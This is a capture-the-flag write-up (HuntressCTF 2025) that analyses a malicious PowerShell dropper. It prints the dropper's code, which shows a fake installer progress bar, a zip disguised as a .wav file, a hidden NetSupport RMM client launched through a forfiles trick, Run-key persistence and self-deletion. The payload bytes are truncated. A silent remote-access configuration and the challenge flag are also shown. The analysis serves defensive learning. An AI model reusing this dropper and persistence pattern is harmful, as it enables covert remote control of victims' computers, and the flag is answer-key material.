---
title: "HuntressCTF 2025 - NetSupport"
date: 2025-10-23
categories: [Capture The Flags, HuntressCTF2025]
tags: [CTF, Writeups, Malware]
---

## Challenge Prompt

An unexpected Remote Monitoring and Management (RMM) tool was identified on this laptop. We identified a suspicious PowerShell script written to disk at a similar time. Can you find the link between the two?

---

## 1. Getting started

Here, we were provided with a powershell script called NetSupport and thus begins the process of analysing it 

below is the provided ps script:

```powershell
$lknHlal = Join-Path -Path $env:TEMP -ChildPath '.__init__log'
if (Test-Path $lknHlal) {
    Write-Host 'Already executed!' -ForegroundColor Red
    exit
} else {
    try { New-Item -Path $lknHlal -ItemType File -Force | Out-Null } catch { Write-Host 'Cannot create marker file' }
}

Write-Host 'Installing SecureModule Engine v1.0.0' -ForegroundColor Cyan
Start-Sleep 1
Write-Host 'Preparing virtual container...'; Start-Sleep 1
Write-Host '[..........] 0%' -NoNewline; Start-Sleep 1; Write-Host ' [████▒▒▒▒▒▒] 47%'
Write-Host '[████████▒▒] 88%' -NoNewline; Start-Sleep 1; Write-Host ' [██████████] 100%'
Write-Host 'Done.' -ForegroundColor Green

$LjLSTACGF = Join-Path (Join-Path $env:USERPROFILE 'Documents') 'HQz3E9v1.wav'

[Byte[]]$xϞzzghϞ = @(80,75,3,4,20,0,0,0,0,0,72,190,71...very very long string)

[byte[]]$kKtyJL = $xϞzzghϞ + $mcZΛkϞπ + $RζπrMwGEQi
[IO.File]::WriteAllBytes($LjLSTACGF, $kKtyJL)
$weBRvm = [IO.Path]::ChangeExtension($LjLSTACGF, 'zip')
Rename-Item -Path $LjLSTACGF -NewName (Split-Path $weBRvm -Leaf) -Force -ErrorAction SilentlyContinue
$CRKaNcWH = Join-Path (Join-Path $env:USERPROFILE 'Documents') 'PwNRbgjSHr'
if (-not (Test-Path $CRKaNcWH)) { New-Item -ItemType Directory -Path $CRKaNcWH | Out-Null }
try { (Get-Item $CRKaNcWH).Attributes = 'Hidden' } catch { }
Start-Sleep (Get-Random -Min 3 -Max 6)
Expand-Archive -Path $weBRvm -DestinationPath $CRKaNcWH -Force
Remove-Item $weBRvm -Force -ErrorAction SilentlyContinue
$ziπbKVG = Join-Path $CRKaNcWH 'client32.exe'
Start-Sleep 10
if (Test-Path $ziπbKVG -PathType Leaf) {
    $wd = Split-Path $ziπbKVG -Parent
    $exe = $ziπbKVG
    try {
        $quoted = '"' + $exe + '"'
        $cmdLine = 'forfiles /p C:\Windows\System32 /m calc.exe /c "cmd /c start \"\" \"C:\Windows\explorer.exe\" ' + $quoted + ' \""'
        cmd.exe /c $cmdLine
    } catch { }
} else {
}
$regPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
$val = '"' + $ziπbKVG + '"'
Set-ItemProperty -Path $regPath -Name 'SecureModule' -Value $val -Force
Write-Host 'Finalizing...'
try { Remove-Item -Path $MyInvocation.MyCommand.Path -Force } catch {}

```

Upon understanding the code, I got to know this

1. Magic number of zip is PK\003\004, the starting numbers (in decimal format) in the variable `xϞzzghϞ` translated to zip's magic number in hex.

    *80 → 0x50*

    *75 → 0x4B*

    *3  → 0x03*


    *4  → 0x04*

2. The script is first extracting this zip but saving it as `HQz3E9v1.wav` in the `Documents` folder. After which it then renames it back to `.zip`
3. It then extracts the zip content into `PwNRbgjSHr` and from there extracts a file called `client32.exe`
4. Then it sets persistence via `HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\SecureModule` by setting its path to that of the exe

---

## 2. Extracting the zip from the powershell script

I knew it was zip but I didn't know the code to extract the zip, so for this I used gpt to write the desired code.

```python
~/Downloads ❯ cat code.py                                                   
#!/usr/bin/env python3
# Usage: python3 extract_zip_from_ps1.py dropper.ps1 reconstructed.zip

import sys
import re
from pathlib import Path

if len(sys.argv) < 3:
    print("Usage: extract_zip_from_ps1.py dropper.ps1 reconstructed.zip")
    sys.exit(1)

ps1 = Path(sys.argv[1]).read_text(encoding='utf-8', errors='replace')

# 1) find WriteAllBytes target variable
m = re.search(r'\[IO\.File\]::WriteAllBytes\s*\([^,]+,\s*(\$\S+?)\s*\)', ps1, re.S)
if not m:
    m = re.search(r'WriteAllBytes\s*\([^,]+,\s*(\$\S+?)\s*\)', ps1, re.S)
if not m:
    print("Cannot find WriteAllBytes target variable.")
    # continue but we'll try to find expression in call
    target_var = None
else:
    target_var = m.group(1).lstrip('$')
    print("Target variable:", target_var)

# 2) find arrays of form $name = @( ...numbers... )
arrays = {}
for am in re.finditer(r'(\$\S+?)\s*=\s*@\(\s*(.*?)\s*\)', ps1, re.S):
    var = am.group(1).lstrip('$')
    nums_block = am.group(2)
    nums = re.findall(r'\d+', nums_block)
    arrays[var] = bytes([int(n) & 0xff for n in nums])
    print(f"Found array {var} -> {len(arrays[var])} bytes")

# 3) determine concat order
order = []
if target_var:
    # find assignment for target var: $target = $a + $b + $c
    m2 = re.search(r'(\$\s*' + re.escape(target_var) + r')\s*=\s*([^\r\n;]+)', ps1, re.S)
    if m2:
        rhs = m2.group(2)
        vars_found = re.findall(r'\$(\S+)', rhs)
        order = [v for v in vars_found]
        print("Order from target assignment:", order)
if not order:
    # try to find expression directly in WriteAllBytes call
    m3 = re.search(r'\[IO\.File\]::WriteAllBytes\s*\([^,]+,\s*\(?\s*([^\)\r\n]+)\s*\)?\s*\)', ps1, re.S)
    if m3:
        expr = m3.group(1)
        order = re.findall(r'\$(\S+)', expr)
        print("Order from WriteAllBytes expression:", order)

if not order:
    print("Falling back to concatenating all parsed arrays in file order.")
    order = list(arrays.keys())

# 4) assemble bytes
out = bytearray()
for v in order:
    if v in arrays:
        out.extend(arrays[v])
    else:
        print(f"Warning: referenced array {v} not found in parsed arrays; skipping.")

if len(out) == 0:
    print("No bytes assembled. Exiting.")
    sys.exit(2)

outpath = Path(sys.argv[2])
outpath.write_bytes(out)
print(f"Wrote {len(out)} bytes to {outpath}")

# quick check for PK header
if out[:4] == b'PK\x03\x04':
    print("ZIP header detected.")
else:
    print("First 4 bytes:", out[:8])
    print("Warning: first bytes are not PK header; ordering may be wrong.")

```

Running the code, I got the zip file


```bash
~/Downloads ❯ python3 code.py netsupport.ps1 extracted_zip.zip
Target variable: kKtyJL
Found array xϞzzghϞ -> 3165934 bytes
Order from target assignment: ['xϞzzghϞ', 'mcZΛkϞπ', 'RζπrMwGEQi']
Warning: referenced array mcZΛkϞπ not found in parsed arrays; skipping.
Warning: referenced array RζπrMwGEQi not found in parsed arrays; skipping.
Wrote 3165934 bytes to extracted_zip.zip
ZIP header detected.
```

Seeing the contents, I could see there was a `client32.exe` file present 

```bash
~/Downloads/extracted_zip/download ❯ ll
total 6704
-rw-rw-r-- 1 lightning lightning   89416 Jul 13 19:09 AudioCapture.dll
-rw-rw-r-- 1 lightning lightning  121464 Apr 14  2025 client32.exe
-rw-rw-r-- 1 lightning lightning     901 Oct  7 23:53 CLIENT32.ini
-rw-rw-r-- 1 lightning lightning  323912 Jul 13 19:09 HTCTL32.DLL
-rw-rw-r-- 1 lightning lightning 1451224 Aug  6 05:59 kfla.exe
-rw-rw-r-- 1 lightning lightning  773968 Jul 13 19:09 msvcr100.dll
-rw-rw-r-- 1 lightning lightning     328 Jul 13 19:09 nskbfltr.inf
-rw-rw-r-- 1 lightning lightning    6099 Jul 13 19:09 NSM.ini
-rw-rw-r-- 1 lightning lightning     253 Jul 13  2012 NSM.LIC
-rw-rw-r-- 1 lightning lightning      46 Jul 13 19:09 nsm_vpro.ini
-rw-rw-r-- 1 lightning lightning  108944 Jul 13 19:09 pcicapi.dll
-rw-rw-r-- 1 lightning lightning   14664 Jul 13 19:09 PCICHEK.DLL
-rw-rw-r-- 1 lightning lightning 3490632 Jul 13 19:09 PCICL32.DLL
-rw-rw-r-- 1 lightning lightning   59728 Jul 13 19:09 remcmdstub.exe
-rw-rw-r-- 1 lightning lightning  387400 Jul 13 19:09 TCCTL32.DLL
```

Analysed the client32.exe using `strings` command but nothing useful was there so then I moved to `client32.ini`. In it I found a base64 encoded string

```bash
~/Downloads/extracted_zip/download ❯ strings CLIENT32.ini 
0x435302e0
[Client]
_present=1
DisableChat=1
DisableClientConnect=1
DisableDisconnect=1
DisableLocalInventory=1
DisableMessage=1
DisableReplayMenu=1
DisableRequestHelp=1
HideWhenIdle=1
Protocols=3
RADIUSSecret=dgAAAPpMkI7ke494fKEQRUoablcA
Shared=1
silent=1
SKMode=1
SOS_Alt=0
SOS_LShift=0
SOS_RShift=0
SysTray=0
Usernames=*
ValidAddresses.TCP=*
[_Info]
Filename=C:\Users\Administrator\Desktop\Svservices\client32.ini
[_License]
quiet=1
[Audio]
DisableAudioFilter=1
[Bridge]
PasswordFile=C:\Program Files\NetSupport\NetSupport Manager\bridgegevvwe21.psw
Flag=ZmxhZ3tiNmU1NGQwYTBhNWYyMjkyNTg5YzM4NTJmMTkzMDg5MX0NCg==
[General]
BeepUsingSpeaker=0
[HTTP]
GatewayAddress=polygonben.github.io
gsk=FN;J?ACCHJ<O?CBEGB;MEC:B
gskmode=0
GSK=FN;J?ACCHJ<O?CBEGB;MEC:B
GSKX=FP;L?CCEHL=A?EBGGD;O:ABA;D@C
Port=443
SecondaryGateway=@polygonben
SecondaryPort=443
```
---

## 3. Extracting the flag

I then proceeded to decode the string and that was it?

```bash
~/Downloads/extracted_zip/download ❯ echo ZmxhZ3tiNmU1NGQwYTBhNWYyMjkyNTg5YzM4NTJmMTkzMDg5MX0NCg== | base64 -d
flag{b6e54d0a0a5f2292589c3852f1930891}
```

Flag: flag{b6e54d0a0a5f2292589c3852f1930891}

This was pretty easy..hope you enjoyed reading it!

***
